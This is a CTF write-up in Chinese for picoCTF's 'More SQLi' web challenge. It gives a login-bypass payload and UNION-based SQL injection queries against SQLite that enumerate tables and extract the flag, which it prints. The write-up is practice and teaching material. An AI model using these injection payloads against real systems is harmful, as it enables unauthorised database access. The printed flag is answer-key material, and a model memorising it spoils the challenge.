---
title: PicoCTF - More SQLi
tags: [PicoCTF, CTF, Web]

category: "Security/Practice/PicoCTF/Web"
---

# PicoCTF - More SQLi
<!-- more -->

## Background
* [Feifei Lab](https://lab.feifei.tw/practice/sqli/sql4.php)
* Hint SQLiLite

## Recon
先隨便輸入發現他很貼心有給完整的payload，發現他是先檢查password，在沒有任何防護的情況下，直接用最經典的payload就可了
Account: Any
Password: `' or '1'='1' -- #`
![](https://hackmd.io/_uploads/rJXd-oLd3.png)

---
![](https://hackmd.io/_uploads/Bki0WoLd3.png)

## Exploit - SQLi(Union Selection)
現在的目標是flag應該是藏在別的table，所以先找甚麼table
1. 找table
透過[Kaibro的cheat sheet](https://github.com/w181496/Web-CTF-Cheatsheet#sqlite)，SQLite的爆破payload是`SELECT name FROM sqlite_master WHERE type='table'`，而目前我們可以用union based的方式搜尋，先觀察搜尋`Algiers`的搜尋column有三個，第一個column是chr，第二個column是chr，第三個是int，所以在用union select的時候要遵守<font color="FF0000">**查詢數量一樣、每個欄位的型態一樣**</font>
Payload: `Algiers' union SELECT sql,sql,1 FROM sqlite_master WHERE type='table'; --`
    :::spoiler Screenshot
    ![](https://hackmd.io/_uploads/rk9G4oLO2.png)
    :::
2. Find Flag - Union based
目前發現有兩個table比較可疑
    * CREATE TABLE hints (id INTEGER NOT NULL PRIMARY KEY, info TEXT)
    * CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT)
    
    可以直接用前面同樣的方式找flag，觀察這個table只有兩個column，且一個column的type是int，另外一個是text，而第三個column就隨便填
    Payload: `Algiers' union SELECT id,flag,1 FROM more_table; --`
    :::spoiler Screenshot
    ![](https://hackmd.io/_uploads/ryonEoIdn.png)
    :::
    Flag: `picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_98236ce6}`

## Reference
[ picoCTF 2023 More SQLi ](https://youtu.be/W1EjP6OFpUQ)
[Kaibro - SQLi](https://github.com/w181496/Web-CTF-Cheatsheet#sqlite)
[Feifei Lab](https://lab.feifei.tw/practice/sqli/sql4.php)